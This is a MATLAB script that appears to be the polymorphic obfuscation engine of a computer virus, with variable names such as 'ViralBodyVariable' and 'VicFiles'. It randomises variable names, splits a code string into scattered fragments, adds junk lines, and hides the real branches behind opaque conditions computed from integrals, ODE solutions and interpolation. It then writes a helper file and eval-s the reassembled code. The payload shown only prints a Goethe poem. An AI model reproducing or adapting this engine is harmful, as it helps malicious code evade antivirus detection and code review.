warning off all

MyCode='disp(''Bedecke deinen Himmel, Zeus, Mit Wolkendunst, Und übe, dem Knaben gleich, Der Disteln köpft, An Eichen dich und Bergeshöhn; Müßt mir meine Erde Doch lassen stehn, Und meine Hütte, die du nicht gebaut, Und meinen Herd Um dessen Gluth Du mich beneidest.'');';
ChangeNumber=1*length(MyCode); % Can be included to the code directly
MyCode=[MyCode,' '];
VarList2Change={'MyCode' 'TmpRndName' 'ThisVarContainsVirus'  'VarList2Change' 'ChangeNumber' 'FfAll' 'DfAll' 'SplitOffset' 'CodePart' 'Rnames' 'NewCode' 'TrashNames' 'TrashLine' 'SplitSize' 'QuoteSign' 'CreateTrashA' 'CreateTrashB' 'CreateTrashC' 'CreateTrashD' 'CreateTrash1' 'CreateTrash2' 'ODEfile' 'odefunction' 'RandPermSS' 'AlgoMatrix' 'ViralBodyVariable' 'ActualCodeForThisPart' 'Var2Wrt' 'ObfusCount' 'RandomAppearenceOfIfs' 'LineBreaksIf' 'LineShift' 'runcode' 'RandNameCol' 'CODE' 'TRASH' 'WhichMathAlgo' 'FReplacePool1' 'StartFunction' 'SReplacePool1' 'OReplacePool1' 'MatSizeN' 'SomeMatVec' 'MultFct' 'SpecMatName' 'SpecVecName' 'WhichMatrixAlgo' 'MatArOp' 'VecArOp' 'SavedVector' 'IsItAVector' 'Operator1' 'Operator2' 'BoundAll1' 'BoundAll2' 'BoundAll3' 'BoundTmpA' 'BoundTmpB' 'BoundSign' 'FctString1' 'FctString2' 'FctString3' 'IntTolerance' 'TimeMeasure' 'CompleteCompString' 'CompleteErg' 'InterpDataVec' 'InterpSpline' 'ODEIntervallA' 'ODEIntervallB' 'ODEDomain' 'ODEIntX' 'SReplacePool2' 'RCWriteVar' 'RCNumSub' 'RCNumAdd' 'MulFacRC' 'IncFa' 'RC' 'RCsSub' 'RCsAdd' 'VirCode' 'IsAllEmpty' 'VicFiles' 'VicLines' 'NewInfCode' 'VicIDr' 'IsAPO' 'EndArray' 'EndCount' 'GoodLine' 'IsAPP' 'IsStart' 'IsEnd' 'VCsplitted' 'VirSplit' 'VicIDw' 'Count000' 'Count001' 'Count002' 'Count003' 'Count004' 'Count005' 'Count006' 'Count007' 'Count008' 'Count009' 'Count010' 'Count011' 'Count012' 'Count013' 'Count014' 'Count015' 'Count016' 'Count017' 'Count018' 'Count019' 'Count020' 'Count021' 'Count022' 'Count023' 'Count024' 'Count025' 'Count026' 'Count027' 'Count028' 'Count029' 'Count030' 'Count031' 'Count032' 'Count033' 'TmpVar001' 'TmpVar002' 'TmpVar003' 'TmpVar004' 'TmpVar005' 'TmpVar006' 'TmpVar007' 'TmpVar008'};
FfAll={'sin' 'sinh' 'asin' 'asinh' 'cos' 'cosh' 'acos' 'acosh' 'tan' 'tanh' 'atan' 'atanh' 'sec' 'sech' 'asec' 'asech' 'csc' 'csch' 'acsc' 'acsch' 'cot'  'coth' 'acot' 'acoth' 'exp' 'expm1' 'log' 'log1p' 'log10' 'log2' 'pow2' 'sqrt' 'nextpow2' 'abs' 'angle' 'conj' 'imag' 'real' 'unwrap' 'fix' 'floor' 'ceil' 'round' 'sign' 'airy' 'expint'};
DfAll={'hypot' 'dot' 'cart2pol' 'pol2cart' 'atan2'};
TmpRndName={};
for Count032=1:length(VarList2Change) % Random Names for VariableNameChaning
    TmpRndName{end+1}='if';while (any(strcmp({FfAll{:} DfAll{:} TmpRndName{1:end-1}},TmpRndName{end}))||iskeyword(TmpRndName{end})) TmpRndName{end}=char(fix(rand(1,fix(rand*15)+5)*25)+97);end
end

for Count031=1:length(VarList2Change) % VariableNameChaning
    MyCode=strrep(MyCode,VarList2Change{Count031},TmpRndName{Count031});
end

SeedCounter=fix(rand*10000+sum(cputime));

rand('twister', SeedCounter);        
                      
SplitOffset=unique([1,sort(fix(rand(1,fix(rand*ChangeNumber)+3)*size(MyCode,2)+1)),size(MyCode,2)]);
CodePart={}; Rnames={}; NewCode={}; TrashNames={}; TrashLine={};
SplitSize=size(SplitOffset,2)-1;    % Number of code parts

QuoteSign=char(39);
for Count033=1:SplitSize
    CodePart{end+1}=strrep(MyCode(SplitOffset(Count033):SplitOffset(Count033+1)-1), QuoteSign, [QuoteSign QuoteSign]);          % CodePart
    Rnames{end+1}='sin'; while any(strcmp({FfAll{:} DfAll{:} Rnames{1:end-1}},Rnames{end})) Rnames{end}=char(fix(rand(1,fix(rand*15)+4)*25)+97);end           % Random Names
end

CreateTrashA='if(max(sum(AlgoMatrix))>0.05*SplitSize)TrashNames=Rnames(diag(AlgoMatrix));end;tmp=rand;tn=fix(rand*(length(TrashNames)-1)+1);tmpord=randperm(length(TrashNames));';
CreateTrashB=['if (tmp>0.9) TrashLine{end+1}=[Rnames{fix(rand*SplitSize+1)} ',QuoteSign,'=',QuoteSign,',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,',QuoteSign,';',QuoteSign,'];else'];
CreateTrashC=['if (tmp>0.7 && length(TrashNames)) TrashLine{end+1}=[TrashNames{tn},',QuoteSign,'=[',QuoteSign,',TrashNames{tn},',QuoteSign,' ',QuoteSign,',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,',QuoteSign,'];',QuoteSign,'];'];
CreateTrashC=[CreateTrashC 'elseif (tmp>0.5 && length(TrashNames)>2) TrashLine{end+1}=[TrashNames{tmpord(1)},',QuoteSign,'=[',QuoteSign,',TrashNames{tmpord(2)},',QuoteSign,' ',QuoteSign,',TrashNames{tmpord(1)},',QuoteSign,'];',QuoteSign,'];'];
CreateTrashC=[CreateTrashC 'elseif (tmp>0.3 && length(TrashNames)>2) TrashLine{end+1}=[TrashNames{tmpord(1)},',QuoteSign,'=[',QuoteSign,',TrashNames{tmpord(1)},',QuoteSign,' ',QuoteSign,',TrashNames{tmpord(2)},',QuoteSign,'];',QuoteSign,'];'];
CreateTrashC=[CreateTrashC 'elseif (tmp>0.1 && length(TrashNames)) TrashLine{end+1}=[TrashNames{tn},',QuoteSign,'=[',QuoteSign,',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,',QuoteSign,' ',QuoteSign,',TrashNames{tn},',QuoteSign,'];',QuoteSign,'];'];
CreateTrashD=['else TrashLine{end+1}=[Rnames{tn},',QuoteSign,'=',QuoteSign,',QuoteSign,char(fix(rand(1,fix(rand*2)+2)*25)+97),QuoteSign,',QuoteSign,';',QuoteSign,'];end'];
CreateTrash1=[CreateTrashA CreateTrashB CreateTrashC CreateTrashD];
CreateTrash2=[CreateTrashA CreateTrashC 'else TrashLine{end+1}=[TrashNames{tn},',QuoteSign,'=[',QuoteSign,',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,',QuoteSign,' ',QuoteSign,',TrashNames{tn},',QuoteSign,'];',QuoteSign,'];end'];

ODEfile=fopen('odefunction.m','w+');
fprintf(ODEfile,['function status=odefunction(t,y,flagzz,args);status=0;if ~isempty(t) if ~any(abs(t-t(1))>1.e-4) disp(',QuoteSign,'toooo small',QuoteSign,');status=1;end;end']);
fclose(ODEfile);
rehash;

%M  = false(SplitSize);
%M( ... ) = true;
%~any(all(M))
disp('Start Algo');
RandPermSS=randperm(SplitSize);  % Random order of the Code elements
AlgoMatrix=false(SplitSize,SplitSize);  % Algorithm matrix
for Count000=1:SplitSize
    disp([num2str(Count000) '/' num2str(SplitSize)]);
    if (RandPermSS(Count000)>1)
        for Count001=1:SplitSize
            if (rand>0.4 && AlgoMatrix(RandPermSS(Count000)-1,Count001))
                NewCode{end+1}=[Rnames{Count001},'=[',Rnames{Count001},' ',QuoteSign,CodePart{RandPermSS(Count000)},QuoteSign,'];'];
                AlgoMatrix(RandPermSS(Count000),Count001)=1;
                eval(CreateTrash1);
            end
        end
    end
    if (sum(AlgoMatrix(RandPermSS(Count000),:),2)==0 && RandPermSS(Count000)<SplitSize-1)
        for Count002=1:SplitSize
            if (rand>0.4 && AlgoMatrix(RandPermSS(Count000)+1,Count002)==1)
                NewCode{end+1}=[Rnames{Count002},'=[',QuoteSign,CodePart{RandPermSS(Count000)},QuoteSign,' ',Rnames{Count002},'];'];
                AlgoMatrix(RandPermSS(Count000),Count002)=1;
                eval(CreateTrash1);
            end
        end
    end
    if (sum(AlgoMatrix(RandPermSS(Count000),:),2)==0)
        NewCode{end+1}=[Rnames{RandPermSS(Count000)},'=',QuoteSign,CodePart{RandPermSS(Count000)},QuoteSign,';'];
        AlgoMatrix(RandPermSS(Count000),RandPermSS(Count000))=1;
        TrashNames{end+1}=Rnames{RandPermSS(Count000)};
        eval(CreateTrash1);
    end
    for Count003=2:SplitSize                                                            % Count003 ... zeile
        for Count004=1:SplitSize                                                        % Count004 ... spalte
            Count005=find(AlgoMatrix(Count003,:));
            if (~AlgoMatrix(Count003,Count004) && AlgoMatrix(Count003-1,Count004) && size(Count005,2)>0 && rand>0.4)
                if (rand>0.5)
                    NewCode{end+1}=[Rnames{Count004},'=[',Rnames{Count004},' ',Rnames{Count005},'];'];
                    AlgoMatrix(:,Count004)=AlgoMatrix(:,Count004)+AlgoMatrix(:,Count005);
                    AlgoMatrix(:,Count005)=0;
                    eval(CreateTrash1);
                else
                    NewCode{end+1}=[Rnames{Count005},'=[',Rnames{Count004},' ',Rnames{Count005},'];'];
                    AlgoMatrix(:,Count005)=AlgoMatrix(:,Count005)+AlgoMatrix(:,Count004);
                    AlgoMatrix(:,Count004)=0;
                    eval(CreateTrash1);
                end
            end
        end
    end
end

while ~any(all(AlgoMatrix))
    for Count006=2:SplitSize                                                            % Count006 ... zeile
        for Count007=1:SplitSize                                                        % Count007 ... spalte
            Count008=find(AlgoMatrix(Count006,:)); 
            if (~AlgoMatrix(Count006,Count007) && AlgoMatrix(Count006-1,Count007) && size(Count008,2)>0 && rand>0.4)
                if (rand>0.5)
                    NewCode{end+1}=[Rnames{Count007},'=[',Rnames{Count007},' ',Rnames{Count008},'];'];
                    AlgoMatrix(:,Count007)=AlgoMatrix(:,Count007)+AlgoMatrix(:,Count008);
                    AlgoMatrix(:,Count008)=0;
                    TrashNames=Rnames(diag(AlgoMatrix));
                    eval(CreateTrash2);
                else
                    NewCode{end+1}=[Rnames{Count008},'=[',Rnames{Count007},' ',Rnames{Count008},'];'];
                    AlgoMatrix(:,Count008)=AlgoMatrix(:,Count008)+AlgoMatrix(:,Count007);
                    AlgoMatrix(:,Count007)=0;
                    TrashNames=Rnames(diag(AlgoMatrix));
                    eval(CreateTrash2);
                end
            end
        end
    end
end

for Count009=1:size(NewCode,2)
    disp(NewCode{Count009});
    eval(NewCode{Count009});
end
ViralBodyVariable=Rnames{sum(AlgoMatrix)==SplitSize};
NewCode=strrep(NewCode,ViralBodyVariable,TmpRndName{1});
TrashLine=strrep(TrashLine,ViralBodyVariable,TmpRndName{1});
%disp(ViralBodyVariable);
disp('After Splitting:')
eval(Rnames{sum(AlgoMatrix)==SplitSize});


ActualCodeForThisPart={}; Var2Wrt={}; ObfusCount=1;
RandomAppearenceOfIfs=fix(rand*2);LineBreaksIf=fix(rand(1,4)*2);LineShift={};LineShift{1}(1:fix(rand*8))=' ';
if rand>0.7 LineShift{1}='    ';end;if rand>0.3 LineShift{2}=LineShift{1};else LineShift{2}(1:fix(rand*8))=' ';end

while(ObfusCount<=length(NewCode))
    Var2Wrt{ObfusCount}={};
    ActualCodeForThisPart{ObfusCount}={};
    runcode=0; RandNameCol={};
    for Count010=0:10
        RandNameCol{end+1}='if';while (any(strcmp({FfAll{:} DfAll{:} Rnames{:} RandNameCol{1:end-1}},RandNameCol{end}))||iskeyword(RandNameCol{end})) RandNameCol{end}=char(fix(rand(1,fix(rand*15)+5)*25)+97);end
    end

    CODE=NewCode{ObfusCount};
    TRASH=TrashLine{ObfusCount};

    WhichMathAlgo=fix(rand*5);
    if (WhichMathAlgo==1 || WhichMathAlgo==3)
        FReplacePool1={'sin' 'cos' 'exp' 'atan'};
        StartFunction='SOS';SReplacePool1={'(SOS)' 'F(S)' 'if' 'if'};
        while(~isempty(strfind([FReplacePool1{:}], SReplacePool1{3}))||iskeyword(SReplacePool1{3}))SReplacePool1{3}=char(fix(rand(1,fix(rand*4)+2)*25)+97);end
        SReplacePool1{4}=SReplacePool1{3};  OReplacePool1={'.*' '+'};
        while length(strfind(StartFunction,'S'))+length(strfind(StartFunction,'O'))+length(strfind(StartFunction,'F'))>0
            TmpVar001=fix(rand*length(SReplacePool1)+1); StartFunction=regexprep(StartFunction, 'S',SReplacePool1{TmpVar001},rand*length(strfind(StartFunction,'S'))+1); if (TmpVar001>2 && strcmp(SReplacePool1{3}, SReplacePool1{4})); while(~isempty(strfind(SReplacePool1{4},SReplacePool1{3})) || ~isempty(strfind(SReplacePool1{3},SReplacePool1{4})) || ~isempty(strfind([FReplacePool1{:}], SReplacePool1{4})) || iskeyword(SReplacePool1{4})) SReplacePool1{4}=char(fix(rand(1,fix(rand*4)+2)*25)+97); end; end;
            StartFunction=regexprep(StartFunction, 'O',OReplacePool1{fix(rand*length(OReplacePool1)+1)},rand*length(strfind(StartFunction,'O'))+1);
            StartFunction=regexprep(StartFunction, 'F',FReplacePool1{fix(rand*length(FReplacePool1)+1)},rand*length(strfind(StartFunction,'F'))+1);
            if (max(cumsum(StartFunction=='(')-cumsum(StartFunction==')'))>25) SReplacePool1{1}=SReplacePool1{3}; SReplacePool1{2}=SReplacePool1{4}; end;      % restricting the function to depth<25
        end
    end

    if (WhichMathAlgo==0)
        MatSizeN=fix(rand*5)+3;
        SomeMatVec{1}=[RandNameCol{end} '=[']; SomeMatVec{2}=[RandNameCol{end-1} '=[']; SomeMatVec{3}=[RandNameCol{end-2} '=['];
        MultFct=rand*30;
        for Count011=1:MatSizeN        
            SomeMatVec{1}=[SomeMatVec{1} ' ' num2str(rand(1,1)*MultFct)];
            SomeMatVec{2}=[SomeMatVec{2} ';' num2str(rand(1,1)*MultFct)];
            SomeMatVec{3}=[SomeMatVec{3} ';'];
            for Count012=1:MatSizeN
                SomeMatVec{3}=[SomeMatVec{3} ' ' num2str(rand(1,1)*MultFct)];
            end
        end
        SomeMatVec{1}=[SomeMatVec{1} '];']; SomeMatVec{1}(size(RandNameCol{end},2)+3)=''; eval(SomeMatVec{1});
        SomeMatVec{2}=[SomeMatVec{2} '];']; SomeMatVec{2}(size(RandNameCol{end-1},2)+3)=''; eval(SomeMatVec{2});
        SomeMatVec{3}=[SomeMatVec{3} '];']; SomeMatVec{3}(size(RandNameCol{end-2},2)+3:size(RandNameCol{end-2},2)+4)=''; eval(SomeMatVec{3});
        SpecMatName={'toeplitz','vander'}; SpecVecName={'pascal','magic','hilb','invhilb','wilkinson'};
        WhichMatrixAlgo=fix(rand*5);
        if (WhichMatrixAlgo==0)                              % Matrix by vectors multiplication
            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};                % write both vectors
            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{2};
            MatName=[RandNameCol{end-1} '*' RandNameCol{end}];
        elseif (WhichMatrixAlgo==1)                        % Direct matrix
            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{3};  % just write matrix
            MatName=[RandNameCol{end-2}];
        elseif (WhichMatrixAlgo==2)                        % Vector input
            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};  % just write row vector
            MatName=[SpecMatName{fix(rand(1,1)*length(SpecMatName)+1)} '(' RandNameCol{end} ')'];
        elseif (WhichMatrixAlgo==3)                        % integer input
            MatName=[SpecVecName{fix(rand(1,1)*length(SpecVecName)+1)} '(' num2str(MatSizeN) ')'];
        elseif (WhichMatrixAlgo==4)                        % Rosser Test matrix
            MatName='rosser';
        end

        % Finished creating matrix; it is in MatNam
        % additional arithmetic functions
        MatArOp={'sin' 'cos' 'sinh' 'cosh' 'exp' 'tan' 'sqrt' 'real' 'imag'};
        for Count013=1:fix(rand*3+1)
            if (rand>0.66) MatName=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' MatName ')']; end
        end
        % Now the matrix operation    
        VecArOp={'sum' 'max' 'min'};
        SavedVector=[VecArOp{fix(rand*size(VecArOp,2)+1)} '(' RandNameCol{end} ')'];   
        IsItAVector=1;
        if (rand>0.44) SavedVector=num2str(rand*100-50); IsItAVector=0; end;
        for Count015=1:fix(rand*3+1)
            if (rand>0.66) SavedVector=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' SavedVector ')']; end
        end
        MatName=[VecArOp{fix(rand*size(VecArOp,2)+1)} '(' MatName ')'];
        for Count016=1:fix(rand*3+1)
            if (rand>0.85) MatName=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' MatName ')']; end
        end
        MatName=[VecArOp{fix(rand*size(VecArOp,2)+1)} '(' MatName ')'];
        for Count017=1:fix(rand*3+1)
            if (rand>0.85) MatName=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' MatName ')']; end
        end
        TmpVar002=fix(rand*4);
        Operator1=''; Operator2='';
        if (eval(SavedVector)>eval(MatName)) Operator1='>'; Operator2='<'; end
        if (eval(SavedVector)<eval(MatName)) Operator1='<'; Operator2='>'; end
        if (~isempty(Operator1))
            ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} CODE];
            ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} TRASH];                 
            if (sum(strcmp(Var2Wrt{ObfusCount},SomeMatVec{1}))==0 && IsItAVector) Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1}; end
            if (TmpVar002==0)
                ActualCodeForThisPart{ObfusCount}{1}=['if((' SavedVector ')' Operator1 MatName ')'];
            elseif (TmpVar002==1)
                ActualCodeForThisPart{ObfusCount}{1}=['if(' MatName Operator1 '(' SavedVector '))'];
                ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
                ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];  
            elseif (TmpVar002==2)
                ActualCodeForThisPart{ObfusCount}{1}=['if((' SavedVector ')' Operator2 MatName ')'];
                ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
                ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];  
            elseif (TmpVar002==3)                
                ActualCodeForThisPart{ObfusCount}{1}=['if(' MatName Operator2 '(' SavedVector '))'];
            end
            ActualCodeForThisPart{ObfusCount}{3}=['else'];
            ActualCodeForThisPart{ObfusCount}{5}=['end'];
        else
            ObfusCount=ObfusCount-1;%ActualCodeForThisPart{ObfusCount}{1}='NO!!! MXT'; 
        end        

        RandNameCol(end)=[]; RandNameCol(end)=[]; RandNameCol(end)=[];
        if ObfusCount
            for Count018=1:size(Var2Wrt{ObfusCount},2)
                eval(Var2Wrt{ObfusCount}{Count018});
            end
        end

    elseif (WhichMathAlgo==1)
        % One or two dimensional integration
        % S -> (SOS) | F(S) | x
        % O -> .* | +
        % F -> sin | cos | exp | atan | ...

        % eval('function out = f(x); out = sin(x); end')
        % f = inline('sin(x)')
        % eval('func=@(x)sin(x);')

                                                                                   % Matlab does not support temporary-indexing; Octave does support it, thus makes Octave a much more power-/beautiful language
        BoundAll1=cellstr(num2str(rand(5,1))); BoundAll2={'pi','log(2)','sqrt(2)','sqrt(3)',BoundAll1{:}}; BoundAll3=randperm(length(BoundAll2));

        if rand>0.6
            StartFunction=strrep(StartFunction,SReplacePool1{4},SReplacePool1{3}); % just one variable for 1d
            %InLineFunc=inline(StartFunction, SReplacePool1{3});
            BoundAll3={BoundAll2{BoundAll3(1:2)}};
            BoundSign=strrep(strrep(cellstr(num2str(rand(2,1)>0.7)),'1','-'),'0',''); BoundAll3={[BoundSign{1} strrep(BoundAll3{1},' ','')],[BoundSign{2} strrep(BoundAll3{2},' ','')]}; BoundTmpA=[eval(BoundAll3{1}) eval(BoundAll3{2})];
            if(sum(abs(sort(BoundTmpA)-BoundTmpA))>0) BoundAll3{3}=BoundAll3{1}; BoundAll3{1}=BoundAll3{2}; BoundAll3{2}=BoundAll3{3}; BoundAll3(3)=[]; end;
            FctString1='quad'; FctString2=''; FctString3='';
           
        else
            %InLineFunc=inline(StartFunction, SReplacePool1{3}, SReplacePool1{4});
            BoundAll3={BoundAll2{BoundAll3(1:4)}};
            BoundSign=strrep(strrep(cellstr(num2str(rand(4,1)>0.7)),'1','-'),'0','');
            BoundAll3={[BoundSign{1} strrep(BoundAll3{1},' ','')],[BoundSign{2} strrep(BoundAll3{2},' ','')],[BoundSign{3} strrep(BoundAll3{3},' ','')],[BoundSign{4} strrep(BoundAll3{4},' ','')]};           
            BoundTmpA=[eval(BoundAll3{1}) eval(BoundAll3{2})];
            BoundTmpB=[eval(BoundAll3{3}) eval(BoundAll3{4})];
            if(sum(abs(sort(BoundTmpA)-BoundTmpA))>0) BoundAll3{5}=BoundAll3{1}; BoundAll3{1}=BoundAll3{2}; BoundAll3{2}=BoundAll3{5}; BoundAll3(5)=[]; end;
            if(sum(abs(sort(BoundTmpB)-BoundTmpB))>0) BoundAll3{5}=BoundAll3{3}; BoundAll3{3}=BoundAll3{4}; BoundAll3{4}=BoundAll3{5}; BoundAll3(5)=[]; end;
            FctString1='dblquad'; FctString2=[',' BoundAll3{3} ',' BoundAll3{4}]; FctString3=[',' SReplacePool1{4}];
        end

        IntTolerance=fix(real(log10(eval([FctString1 '(@(' SReplacePool1{3} FctString3 ')' StartFunction ',' BoundAll3{1} ',' BoundAll3{2} FctString2 ',1e' num2str(6666) ')']))))+5;
        TimeMeasure=0;
        while (TimeMeasure<0.1 && IntTolerance>-23)
            IntTolerance=IntTolerance-1;
            CompleteCompString=[FctString1 '(@(' SReplacePool1{3} FctString3 ')' StartFunction ',' BoundAll3{1} ',' BoundAll3{2} FctString2 ',1e' num2str(IntTolerance) ')'];
            TimeMeasure=cputime;
            CompleteErg=eval(CompleteCompString);
            TimeMeasure=cputime-TimeMeasure;
            if(isnan(CompleteErg) || isinf(CompleteErg))IntTolerance=-50;end
        end        

        if (IntTolerance>-23)     
            runcode=1;
        else
            ObfusCount=ObfusCount-1;%ActualCodeForThisPart{ObfusCount}{1}='NO!!! INT';
        end

    elseif (WhichMathAlgo==2)
        % Fun with interpolation
        TmpVar003=fix(rand*50+4); TmpVar004=rand*1000; InterpDataVec=''; for Count019=0:TmpVar003 InterpDataVec=[InterpDataVec num2str(rand*TmpVar004) ' ']; end; InterpDataVec(end)='';
        Var2Wrt{ObfusCount}{end+1}=[RandNameCol{end} '=[' InterpDataVec '];']; eval(Var2Wrt{ObfusCount}{end}); InterpSpline=''; if (rand>0.6) InterpSpline=[',' QuoteSign 'spline' QuoteSign]; end
        CompleteCompString=['interp1(' RandNameCol{end} ',' num2str(rand*(TmpVar003-1)+1) InterpSpline ')']; RandNameCol(end)=[];
        CompleteErg=eval(CompleteCompString); runcode=1;

    elseif (WhichMathAlgo==3)
        % Ordinary differential equation :)
        Var2Wrt{ObfusCount}{end+1}=[RandNameCol{end} '=inline(' QuoteSign StartFunction QuoteSign ',' QuoteSign SReplacePool1{3} QuoteSign ',' QuoteSign SReplacePool1{4} QuoteSign ');']; eval(Var2Wrt{ObfusCount}{end});
        ODEIntervallA=fix(rand*7-3);ODEIntervallB=fix(ODEIntervallA+rand*4+1);
        Var2Wrt{ObfusCount}{end+1}=['[' RandNameCol{end-1} ',' RandNameCol{end-2} ']=ode45(' RandNameCol{end} ',[' num2str(ODEIntervallA) ' ' num2str(ODEIntervallB) '],' num2str(rand*4) ');'];
        eval([Var2Wrt{ObfusCount}{end}(1:end-2) ',odeset(' QuoteSign 'OutputFcn' QuoteSign ',@odefunction));'])
        ODEDomain=eval(RandNameCol{end-1});
        ODEIntX=num2str(rand*ODEIntervallB+ODEIntervallA);
        if rand>0.5
            CompleteCompString=['interp1(' RandNameCol{end-1} ',' RandNameCol{end-2} ',' ODEIntX ')'];
        else
            CompleteCompString=['interp1(' Var2Wrt{ObfusCount}{end}(strfind(Var2Wrt{ObfusCount}{end},'=')+1:end-1) ',' ODEIntX ')'];
            Var2Wrt{ObfusCount}(end)=[];
        end

        RandNameCol(end)=[]; RandNameCol(end)=[]; RandNameCol(end)=[];
        if (length(ODEDomain)>5&&ODEDomain(end)==ODEIntervallB) CompleteErg=eval(CompleteCompString); else CompleteErg=NaN; end        
        if (isnan(CompleteErg) || isinf(CompleteErg) || ODEDomain(end)~=ODEIntervallB)
            while ~isempty(Var2Wrt{ObfusCount}) Var2Wrt{ObfusCount}(end)=[]; end
            ObfusCount=ObfusCount-1; 
        else
            runcode=1;
        end

    elseif (WhichMathAlgo==4)
        % Special functions :D
        CompleteCompString='F(F(S))'; SReplacePool2={'F(S)' 'F(S)' 'F(S)' 'F(S)' 'F(S)' 'D(S,S)' 'R' 'R'}; 
        while ~isempty(strfind(CompleteCompString,'S'))
            CompleteCompString=regexprep(CompleteCompString, 'S',SReplacePool2{fix(rand*length(SReplacePool2)+1)},rand*length(strfind(CompleteCompString,'S'))+1);
            if (length(strfind(CompleteCompString,'F'))+length(strfind(CompleteCompString,'D'))>10) SReplacePool2={'R'}; end;
        end
        CompleteCompString=regexprep(CompleteCompString, 'S',SReplacePool2{fix(rand*length(SReplacePool2)+1)});
        while length(strfind(CompleteCompString,'D'))+length(strfind(CompleteCompString,'F'))+length(strfind(CompleteCompString,'R'))>0
            CompleteCompString=regexprep(CompleteCompString, 'F',FfAll{fix(rand*length(FfAll)+1)},rand*length(strfind(CompleteCompString,'F'))+1);
            CompleteCompString=regexprep(CompleteCompString, 'D',DfAll{fix(rand*length(DfAll)+1)},rand*length(strfind(CompleteCompString,'D'))+1);
            CompleteCompString=regexprep(CompleteCompString, 'R',num2str(rand*10-5),rand*length(strfind(CompleteCompString,'R'))+1);
        end
        if (max(cumsum(CompleteCompString=='(')-cumsum(CompleteCompString==')'))<25) CompleteErg=eval(CompleteCompString); else CompleteErg=NaN; end
        if (isnan(CompleteErg) || isinf(CompleteErg))
            ObfusCount=ObfusCount-1;
        else
            runcode=1;
        end       
    end

    if (runcode)
        RCWriteVar=0;RCNumSub='0';RCNumAdd='0';
        while (~(CompleteErg>eval(RCNumSub))||~(eval(RCNumSub)<CompleteErg)||~(CompleteErg<eval(RCNumAdd))||~(eval(RCNumAdd)>CompleteErg))
            if WhichMathAlgo==3 MulFacRC=8; IncFacRC=2; else MulFacRC=0.01; IncFacRC=1; end
            RCNumSub=num2str(CompleteErg-(abs(CompleteErg)*MulFacRC+IncFacRC)*rand,5+fix(rand(1,1)*5));
            RCNumAdd=num2str(CompleteErg+(abs(CompleteErg)*MulFacRC+IncFacRC)*rand,5+fix(rand(1,1)*5));
        end
        
        if (rand>0.4)
            RCsSub=[RandNameCol{end} '=' RCNumSub ';']; RCNumSub=RandNameCol{end};
            RCsAdd=[RandNameCol{end} '=' RCNumAdd ';']; RCNumAdd=RandNameCol{end}; RCWriteVar=1; RandNameCol(end)=[];
        end
        ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} CODE];
        ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} TRASH];
        if(RCWriteVar) Var2Wrt{ObfusCount}{end+1}=RCsSub; eval(RCsSub); end
        runcode=1;
        TmpVar005=fix(rand*4);
        
        if (TmpVar005==0)
            if (rand>0.5) ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '>' RCNumSub ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumSub '<' CompleteCompString ')']; end
        elseif (TmpVar005==1)
            if (rand>0.5) ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '<' RCNumSub ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumSub '>' CompleteCompString ')']; end
            ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
            ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];
        elseif (TmpVar005==2)
            if (rand>0.5) ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '>' RCNumAdd ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumAdd '<' CompleteCompString ')']; end
            if(RCWriteVar)Var2Wrt{ObfusCount}{end}=RCsAdd; eval(RCsAdd); end
            ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
            ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];
        elseif (TmpVar005==3)
            if(rand>0.5)ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '<' RCNumAdd ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumAdd '>' CompleteCompString ')']; end
            if(RCWriteVar)Var2Wrt{ObfusCount}{end}=RCsAdd; eval(RCsAdd); end 
        end
        ActualCodeForThisPart{ObfusCount}{3}='else';
        ActualCodeForThisPart{ObfusCount}{5}='end';
    end
    TmpVar006=4;TmpStrWS={'' '' ' ' '' ''};
    while TmpVar006>0        
        if ObfusCount
            if (LineBreaksIf(TmpVar006)==1 && length(ActualCodeForThisPart{ObfusCount})==5)
                ActualCodeForThisPart{ObfusCount}{TmpVar006}=[ActualCodeForThisPart{ObfusCount}{TmpVar006} TmpStrWS{TmpVar006} ActualCodeForThisPart{ObfusCount}{TmpVar006+1}];
                ActualCodeForThisPart{ObfusCount}(TmpVar006+1)=[];
            end
        end
        TmpVar006=TmpVar006-1;
    end
    
    if(RandomAppearenceOfIfs)
        LineBreaksIf=fix(rand(1,4)*2); LineShift={};
        LineShift{1}(1:fix(rand*8))=' '; if rand>0.7 LineShift{1}='    ';end
        if rand>0.4
            LineShift{2}=LineShift{1};
        else
            LineShift{2}(1:fix(rand*8))=' ';
        end;
    end
    ObfusCount=ObfusCount+1;

    disp(ObfusCount/length(NewCode));
end
Var2Wrt{1}{end+1}='warning off all';
ActualCodeForThisPart{end+1}={['TheImportantValue=' TmpRndName{1} '; eval(TheImportantValue);']}; Var2Wrt{end+1}={};
